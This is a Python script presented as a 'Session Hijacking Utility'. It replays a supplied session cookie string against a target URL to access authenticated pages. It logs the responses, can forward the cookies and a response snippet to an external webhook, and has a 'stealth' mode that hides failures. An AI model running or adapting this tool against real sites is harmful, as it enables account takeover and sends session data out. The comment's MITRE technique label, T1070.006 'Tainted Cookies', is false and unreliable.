

import requests
import argparse
import json
import os
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1070.006"  # Indicator Removal on Host: Tainted Cookies

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

def inject_cookie(target_url, cookie_string, stealth=False, webhook=None):
    cookies = dict([tuple(c.strip().split('=')) for c in cookie_string.strip().split(';') if '=' in c])
    try:
        r = requests.get(target_url, cookies=cookies, timeout=6)
        result = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_url,
            "cookies": cookies,
            "status": r.status_code,
            "response_snippet": r.text[:100],
            "type": "cookie_injection",
            "ttp": MITRE_TTP
        }
        log_result(result)
        print(f"[+] Cookie injection status: {r.status_code}")
        if webhook:
            try:
                requests.post(webhook, json=result)
            except:
                if not stealth:
                    print("[!] Webhook delivery failed.")
    except Exception as e:
        if not stealth:
            print(f"[!] Cookie injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Cookie Injector - Session Hijacking Utility")
    parser.add_argument("--url", required=True, help="Target URL requiring authentication")
    parser.add_argument("--cookie", required=True, help='Cookie string (e.g. "sessionid=abc123; user=admin")')
    parser.add_argument("--stealth", action="store_true")
    parser.add_argument("--webhook", help="Webhook for alert reporting")
    args = parser.parse_args()

    inject_cookie(args.url, args.cookie, args.stealth, args.webhook)
